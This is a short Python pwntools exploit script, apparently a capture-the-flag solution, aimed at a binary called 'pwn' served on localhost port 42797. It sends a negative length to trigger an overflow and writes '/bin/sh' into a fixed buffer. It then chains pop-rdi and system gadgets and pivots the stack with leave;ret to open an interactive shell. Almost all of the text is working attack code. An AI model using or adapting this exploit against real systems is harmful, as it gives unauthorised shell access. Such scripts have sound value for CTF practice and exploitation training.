from pwn import *
import ctypes                              # 
context(arch='amd64', os='linux', log_level='debug') # 一些基本的配置。
context.terminal = ["tmux","splitw","-h"]
# io = process('./pwn')             # 在本地运行程序。  
# gdb.attach(io)              
io = connect("127.0.0.1",42797)
elf = ELF('./pwn')

base = 0x404060
pop_rdi = 0x0000000000401219
leave_ret = 0x000000000040120f
ret_addr = 0x40101a
system_addr = elf.plt['system']

io.sendlineafter(b's the length of your introduction.\n', '-1') 
payload_1 = b'/bin/sh\x00' + b'a'*(0x700)
payload_1 += p64(pop_rdi) + p64(base) + p64(ret_addr) +p64(system_addr) + p64(0)
io.sendline(payload_1)
 
payload_2 = b'a'*0xC + p64(base + 0x700) + p64(leave_ret)
io.sendlineafter(b'Now, please tell us your phone number:\n',payload_2)  
io.interactive()
